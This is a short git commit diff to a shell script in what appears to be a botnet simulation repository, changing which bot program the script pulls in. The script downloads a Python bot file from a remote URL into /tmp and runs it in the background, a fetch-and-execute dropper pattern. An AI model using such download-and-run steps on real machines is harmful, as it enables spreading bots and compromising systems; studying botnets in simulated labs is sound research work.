8f42728d32777728478a68270db7140bb36e4eac
rhishi <rhishi.16@gmail.com>
2019-08-26 12:39:55 +0800

    Changing to custom IoT bot.

--- bot/bot.sh
+++ bot/bot.sh
@@ -5,7 +5,6 @@ then
     echo "Process already running."
 else 
     echo "Starting process."
-    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/bot_1.py > /tmp/bot.py
-    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/rps.pem > /tmp/rps.pem
+    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/bot_1_custom_IoT.py > /tmp/bot.py
     python3 /tmp/bot.py 172.16.135.194 192.168.1.99 &
 fi
